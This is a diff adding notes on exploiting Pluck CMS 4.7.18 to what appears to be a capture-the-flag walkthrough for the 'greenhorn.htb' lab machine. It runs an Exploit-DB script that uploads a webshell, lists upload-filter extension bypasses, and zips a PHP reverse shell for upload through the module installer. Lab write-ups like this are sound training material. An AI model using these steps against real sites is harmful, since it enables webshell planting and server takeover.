@@ -496,3 +496,39 @@ mount: /dev/../tmp/: can't find in /etc/fstab.
 uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
 # 
 ```
+
+### Pluck CMS 4.7.18
+
+[https://www.exploit-db.com/raw/49909](https://www.exploit-db.com/raw/49909)
+
+[https://codingninjablogs.tech/tryhackme-dreaming-pluck-cms-44575d7e558a](https://codingninjablogs.tech/tryhackme-dreaming-pluck-cms-44575d7e558a)
+
+User Input:
+
+```
+target_ip = sys.argv[1]
+target_port = sys.argv[2]
+password = sys.argv[3]
+pluckcmspath = sys.argv[4]
+
+python3 exploit.py greenhorn.htb 80 iloveyou1 /
+Authentification was succesfull, uploading webshell
+Uploaded Webshell to: 
+http://greenhorn.htb:80//files/shell.phar
+
+data/inc/files.php: $blockedExtentions = array('.php','php3','php4','php5','php6','php7','phtml','.phtm','.pht','.ph3','.ph4','.ph5','.asp','.cgi','.phar');
+PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module
+```
+
+* file upload is not working well
+
+[https://www.youtube.com/watch?v=GpL\_rz8jgro](https://www.youtube.com/watch?v=GpL_rz8jgro)
+
+* go to [http://greenhorn.htb/admin.php?action=installmodule](http://greenhorn.htb/admin.php?action=installmodule)
+
+```
+zip test.zip php-rev.php
+adding: php-rev.php (deflated 59%)
+```
+
+* upload the zip
